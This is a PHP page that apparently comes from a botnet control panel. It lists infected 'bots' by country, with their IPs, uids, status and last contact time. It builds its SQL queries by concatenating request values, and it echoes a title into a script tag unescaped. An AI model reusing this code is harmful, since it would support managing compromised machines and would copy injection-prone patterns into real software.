<?php
//error_reporting(-1);

get_function('html_pages');
get_function('ts2str');

$list = $mysqli->query('SELECT id,prefix,uid,ip,status,last_date FROM bf_bots WHERE (country = \''.$Cur['str'].'\') ' . $filter . $sort . ' LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['bots_p2p'] : $Cur['page']*$_SESSION['user']->config['cp']['bots_p2p'] . ',' . $_SESSION['user']->config['cp']['bots_p2p']), null, null, false);

$list_count = count($list);
if($_SESSION['user']->config['cp']['bots_p2p'] <= count($list)){
	$counts['alls'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (country = \''.$Cur['str'].'\')' . $filter, null, 'count', 0, 60);
}else{
	$counts['alls'] = $list_count;
}

$smarty->assign('list', $list);
$smarty->assign('counts', $counts);
$smarty->assign('pages', html_pages('/bots/p2p-'.$Cur['str'].'.html?', $counts['alls'], $_SESSION['user']->config['cp']['bots_p2p'], 1, 'bots_list', 'this.href'));


if($Cur['ajax'] == 1){
	print('<script type="text/javascript" language="javascript">document.title = \''.$smarty->tpl_vars['title']->value.'\';</script>');
}

?>